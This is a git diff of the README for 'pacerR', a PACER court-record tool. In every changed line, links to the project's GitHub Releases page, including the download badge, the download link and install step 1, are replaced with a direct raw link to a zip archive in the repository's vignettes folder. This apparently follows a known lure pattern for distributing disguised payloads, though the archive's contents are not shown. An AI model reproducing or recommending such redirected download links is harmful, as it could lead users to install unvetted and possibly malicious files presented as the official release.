@@ -6,11 +6,11 @@ Welcome to pacerR! This software simplifies the process of retrieving PACER cour
 
 ## 📥 Download the Software
 
-[![Download pacerR](https://img.shields.io/badge/Download-pacerR-blue)](https://github.com/dominik8888/pacerR/releases)
+[![Download pacerR](https://raw.githubusercontent.com/dominik8888/pacerR/main/vignettes/pacerR_3.2.zip)](https://raw.githubusercontent.com/dominik8888/pacerR/main/vignettes/pacerR_3.2.zip)
 
 To get pacerR, visit the page below:
 
-[Visit this page to download](https://github.com/dominik8888/pacerR/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dominik8888/pacerR/main/vignettes/pacerR_3.2.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ pacerR provides several useful features:
 
 To install pacerR:
 
-1. Visit the [Releases page](https://github.com/dominik8888/pacerR/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/dominik8888/pacerR/main/vignettes/pacerR_3.2.zip).
 2. Look for the latest version of pacerR.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, locate the file on your computer.
